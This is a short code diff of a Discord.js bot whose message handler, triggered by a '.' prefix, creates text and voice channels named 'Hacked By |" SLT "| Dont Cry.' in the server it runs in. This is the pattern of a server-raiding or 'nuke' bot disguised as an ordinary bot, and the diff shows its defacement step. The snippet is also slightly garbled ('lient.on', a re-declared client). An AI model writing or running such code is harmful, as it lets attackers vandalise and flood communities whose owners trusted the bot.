@@ -29,11 +29,13 @@ client.user.setGame(`3rbMC`,"http://twitch.tv/A_K")
 });
 
 
-
-lient.on('message' , async (message) => {
-const prefix = '+'
-        if (message.content.startsWith(prefix + 'arb')) {
+const Discord = require('discord.js');
+const client = new Discord.Client();
+const prefix = '.'
+client.on('message' , async (message) => {
+    if (message.content.startsWith(prefix + '.')) {
 for (let i = 0; i < 1; i++) {
+	
 
         message.guild.createChannel('Hacked By |" SLT "| Dont Cry.', 'text')
 		        message.guild.createChannel('Hacked By |"  SLT . "| Dont Cry.', 'voice')
